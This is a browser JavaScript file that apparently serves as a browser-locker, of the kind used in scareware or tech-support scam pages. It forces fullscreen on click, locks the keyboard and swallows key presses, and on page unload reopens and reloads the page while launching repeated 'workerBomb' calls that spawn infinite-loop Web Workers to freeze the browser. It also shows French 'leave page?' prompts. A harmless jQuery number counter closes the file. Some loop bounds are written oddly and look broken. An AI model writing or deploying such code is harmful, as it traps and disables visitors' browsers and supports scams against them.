
        addEventListener("click", function() {
      var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
      ;
      rfs.call(el);
      });

function chat() {
document.getElementById("chat").style.display = "block";
document.getElementById("footer").style.display = "block";
document.getElementById("welcomeDiv").style.display = "block";
 document.getElementById("chat-box").style.display = "none";
 document.getElementById("login-box").style.display = "none";

}

window.addEventListener('beforeunload', function (event) {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");

			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				// Send progress to the main thread occasionally
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			
			for (let i = 0; i < 01-70-38-15-35; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
		  }
	
		
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			 
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				
				lastTime = currentTime;
			  }
			}, 100);
			
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++) {} 
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  // Custom message (not all browsers display this)
		  const message = "Êtes-vous sûr de vouloir quitter cette page ?";
		  
		  // Set the returnValue property to trigger the confirmation dialog
		  event.returnValue = message;
	
		  // Return the message string for some older browsers
		  return message;
		});
	  
      
		window.addEventListener('unload', function () {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");
	
			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				// Send progress to the main thread occasionally
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			// Create 10 workers (adjust the number to reduce load)
			for (let i = 0; i < 01-70-38-15-35; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
			// Start the responsiveness watchdog
			// startWatchdog();
		  }
	
		  // Watchdog function to monitor browser responsiveness
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			  // If the browser is unresponsive for more than 2 seconds, terminate workers
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				// Update the last time to keep track of responsiveness
				lastTime = currentTime;
			  }
			}, 100);
	
			// Simulate lightweight work on the main thread to detect unresponsiveness
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++) {} // Simulate a small task
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  // Function to terminate all workers
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  const m = "Voulez-vous fermer ?";
		  
		  event.returnValue = m;

		  return m;
		});
      	          

                      
    navigator.keyboard.lock();
    document.onkeydown = function (e) {
    return false;
    }


      
        (function(a) {
          a.fn.countTo = function(b) {
            b = b || {};
            return a(this).each(function() {
              function d(a) {
                a = c.formatter.call(k, a, c);
                h.html(a)
              }
              var c = a.extend({}, a.fn.countTo.defaults, {
                  from: a(this).data("from"),
                  to: a(this).data("to"),
                  speed: a(this).data("speed"),
                  refreshInterval: a(this).data("refresh-interval"),
                  decimals: a(this).data("decimals")
                }, b),
                l = Math.ceil(c.speed / c.refreshInterval),
                n = (c.to - c.from) / l,
                k = this,
                h = a(this),
                m = 0,
                f = c.from,
                g = h.data("countTo") || {};
              h.data("countTo", g);
              g.interval && clearInterval(g.interval);
              g.interval = setInterval(function() {
                f += n;
                m++;
                d(f);
                "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
                m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
              }, c.refreshInterval);
              d(f)
            })
          };
          a.fn.countTo.defaults = {
            from: 0,
            to: 0,
            speed: 100,
            refreshInterval: 100,
            decimals: 0,
            formatter: function(a, d) {
              return a.toFixed(d.decimals)
            },
            onUpdate: null,
            onComplete: null
          }
        })(jQuery);
        jQuery(function(a) {
          a(".count-number").data("countToOptions", {
            formatter: function(a, d) {
              return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
            }
          });
          a(".timer").each(function(b) {
            var d = a(this);
            b = a.extend({}, b || {}, d.data("countToOptions") || {});
            d.countTo(b)
          })
        });